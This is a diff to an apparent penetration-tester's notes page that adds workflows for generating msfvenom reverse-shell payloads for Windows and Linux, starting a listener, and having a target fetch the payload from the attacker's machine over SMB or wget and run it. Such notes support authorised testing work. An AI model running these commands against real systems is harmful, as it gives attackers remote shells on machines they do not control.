@@ -195,6 +195,37 @@ sudo systemctl stop smbd nmbd
 
 ## Common Workflows
 
+### Payload delivery (Windows target — most common engagement scenario)
+```bash
+# Step 1: generate payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f exe -o ~/payloads/shell.exe
+
+# Step 2 (Terminal 1): start listener
+penelope -0 443
+
+# Step 3 (Terminal 2): start server from payload directory
+cd ~/payloads && ./servr.sh smb
+
+# Step 4 (target shell): pull and execute
+copy \\KALI_IP\share\shell.exe C:\Windows\Temp\shell.exe
+C:\Windows\Temp\shell.exe
+```
+
+### Payload delivery (Linux target)
+```bash
+# Step 1: generate payload
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f elf -o ~/payloads/shell.elf
+
+# Step 2 (Terminal 1): start listener
+penelope -0 443
+
+# Step 3 (Terminal 2): start server
+cd ~/payloads && ./servr.sh http --port 8080
+
+# Step 4 (target shell):
+wget http://KALI_IP:8080/shell.elf -O /tmp/shell && chmod +x /tmp/shell && /tmp/shell
+```
+
 ### Quick engagement-day tool drop (Linux target)
 ```bash
 cd ~/tools
@@ -265,7 +296,7 @@ ip a show tun0
 
 ## Related
 
-- [[File_Transfers]] — manual transfer techniques when servr.sh isn't available
-- [[pivotr]] — if target can't reach Kali directly, set up a tunnel first
-- [[escalatr]] — tools staged and served by escalatr.sh use HTTP (same pattern)
-- [[Reverse_Shells]] — once files are transferred, execute payloads
+- [[File_Transfers]] — manual fallback methods when servr.sh isn't available (restricted Kali env, pivot host serving, base64/exe2hex last resorts)
+- [[Reverse_Shells]] — payload generation (msfvenom); servr.sh is the delivery mechanism post-generation
+- [[pivotr]] — if target can't reach Kali directly, set up Ligolo tunnel first, then run servr.sh normally (use pivot IP on target)
+- [[escalatr]] — tools staged and served by escalatr.sh use HTTP (same pattern as servr.sh http)
